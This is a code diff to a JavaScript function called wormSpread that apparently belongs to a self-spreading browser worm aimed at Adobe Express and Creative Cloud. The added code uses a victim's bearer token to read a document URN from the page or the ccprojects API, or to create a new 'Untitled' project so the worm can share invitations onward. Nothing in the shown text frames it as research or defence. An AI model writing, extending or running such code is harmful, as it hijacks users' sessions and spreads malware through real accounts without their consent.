@@ -117,17 +117,46 @@ async function wormSpread(token) {
     return;
   }
 
-  // Phase B: Find a document URN from current Express context
+  // Phase B: Find or create a document URN for invitation sharing
   let urn = null;
   const urlMatch = window.location.href.match(/urn:aaid:sc:[A-Z0-9]+:[a-f0-9-]+/);
   if (urlMatch) urn = urlMatch[0];
 
-  // If no URN in URL, try to get one from Express project list
+  // Try page HTML
   if (!urn) {
     try {
       const html = document.documentElement.innerHTML;
       const urnMatch = html.match(/urn:aaid:sc:US:[a-f0-9-]+/);
       if (urnMatch) urn = urnMatch[0];
+    } catch {}
+  }
+
+  // Try listing existing projects via ccprojects API
+  if (!urn) {
+    try {
+      const listResp = await fetch('https://ccprojects.adobe.io/api/v3/projects?limit=1&orderBy=-modifyDate', {
+        headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Accept': 'application/hal+json' }
+      });
+      if (listResp.ok) {
+        const listData = await listResp.json();
+        const projects = listData?._embedded?.children || [];
+        if (projects.length > 0) urn = projects[0]['repo:assetId'];
+      }
+    } catch {}
+  }
+
+  // Create a new project if none exist
+  if (!urn) {
+    try {
+      const createResp = await fetch('https://ccprojects-va6.adobe.io/api/v3/projects/:create', {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': 'projectx_webapp', 'Content-Type': 'application/json', 'Accept': 'application/hal+json' },
+        body: JSON.stringify({ 'repo:name': 'Untitled' })
+      });
+      if (createResp.ok) {
+        const proj = await createResp.json();
+        urn = proj['repo:assetId'];
+      }
     } catch {}
   }
 
